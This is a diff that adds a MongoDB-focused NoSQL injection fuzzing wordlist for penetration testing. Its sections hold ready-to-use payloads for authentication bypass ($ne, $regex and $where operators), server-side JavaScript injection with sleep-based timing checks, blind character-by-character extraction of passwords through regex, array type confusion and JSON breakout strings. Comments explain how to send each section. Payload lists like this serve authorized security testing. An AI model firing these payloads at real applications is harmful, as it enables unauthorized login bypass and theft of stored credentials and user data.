@@ -1,0 +1,109 @@
+# ============================================================
+# NoSQL Injection Fuzzing Wordlist (MongoDB-focused)
+# Usage: send as JSON body values, or as param[$ne]= style query params
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Authentication bypass (JSON body payloads)
+# Replace the whole password/username value with these
+# ---------------------------------------
+{"$ne": null}
+{"$ne": ""}
+{"$ne": 1}
+{"$gt": ""}
+{"$gt": -1}
+{"$exists": true}
+{"$exists": false}
+{"$regex": ".*"}
+{"$regex": "^admin"}
+{"$regex": "^a"}
+{"$in": ["admin", "administrator"]}
+{"$nin": [""]}
+{"$where": "1==1"}
+{"$where": "this.password.length > 0"}
+{"$or": [{}]}
+
+# ---------------------------------------
+# SECTION 2: URL-encoded query-string form
+# (for form-style submission, e.g. login[password][$ne]=)
+# ---------------------------------------
+username[$ne]=admin&password[$ne]=x
+username[$regex]=^admin&password[$ne]=x
+username[$exists]=true&password[$exists]=true
+username=admin&password[$ne]=1
+username=admin&password[$gt]=
+username[$in][]=admin&password[$ne]=1
+username[$eq]=admin&password[$regex]=.*
+
+# ---------------------------------------
+# SECTION 3: $where JavaScript injection (MongoDB server-side JS)
+# ---------------------------------------
+{"$where": "sleep(5000)"}
+{"$where": "function(){sleep(5000); return true;}"}
+{"$where": "this.username == this.username"}
+{"$where": "1 == 1"}
+'; return true; var x='
+'; sleep(5000); var x='
+';return(true);var x='
+{"$where":"this.a=='a'||'a'=='a"}
+
+# ---------------------------------------
+# SECTION 4: Operator injection - bare (for JSON body raw values)
+# ---------------------------------------
+$ne
+$gt
+$gte
+$lt
+$lte
+$in
+$nin
+$exists
+$regex
+$where
+$or
+$and
+$not
+$expr
+$mod
+$all
+$elemMatch
+$size
+$type
+
+# ---------------------------------------
+# SECTION 5: Blind extraction via regex (data exfil char by char)
+# Replace VALUE with guessed prefix, e.g. ^a, ^ad, ^adm...
+# ---------------------------------------
+{"username": {"$regex": "^a"}}
+{"username": {"$regex": "^admin"}}
+{"password": {"$regex": "^5f4dcc3b"}}
+{"username": {"$regex": "^a.*$", "$options": "i"}}
+
+# ---------------------------------------
+# SECTION 6: Array / object type confusion (breaks strict-type checks)
+# ---------------------------------------
+username[]=admin
+password[]=
+username=admin&password[]=x
+user[username]=admin&user[password][$ne]=1
+
+# ---------------------------------------
+# SECTION 7: JSON-injection breakout (if value gets concatenated into query)
+# ---------------------------------------
+", "$where": "1==1
+"}, {"$where": "1==1
+", "role": "admin
+"}]}, {"$or": [{"a":"a
+\", \"$or\": [{}], \"a\":\"
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Section 1 payloads go in the JSON request body in place of a
+#   string value, e.g. {"username":"admin","password":{"$ne":null}}
+# - Section 2 is for apps parsing bracket-notation form params into
+#   nested objects (common in Express + body-parser apps).
+# - Confirm blind $where injection (Section 3) via response-time delay
+#   from sleep(), same principle as SQLi time-based blind.
+# - Only use against systems you are explicitly authorized to test.
